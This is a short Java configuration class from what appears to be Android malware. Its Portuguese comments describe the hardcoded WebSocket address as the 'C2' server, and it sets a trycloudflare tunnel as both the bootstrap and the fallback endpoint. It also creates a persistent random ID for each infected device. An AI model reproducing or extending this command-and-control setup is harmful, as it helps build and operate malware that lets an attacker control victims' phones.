package com.aval.seg;

import android.content.Context;

import java.util.Random;

public final class Cfg {
    // Servidor de configuraÃƒÂ§ÃƒÂ£o remoto: primeira linha = URL wss:// do C2
    public static final String BOOTSTRAP = "wss://jim-excluding-developmental-tricks.trycloudflare.com/ws";
    // Fallback embutido, usado se o bootstrap falhar
    public static final String FALLBACK = "wss://jim-excluding-developmental-tricks.trycloudflare.com/ws";

    public static String id(Context c) {
        String s = c.getSharedPreferences("p", 0).getString("id", null);
        if (s == null) {
            String a = "abcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder b = new StringBuilder();
            Random r = new Random();
            for (int i = 0; i < 6; i++) b.append(a.charAt(r.nextInt(a.length())));
            s = b.toString();
            c.getSharedPreferences("p", 0).edit().putString("id", s).apply();
        }
        return s;
    }
}
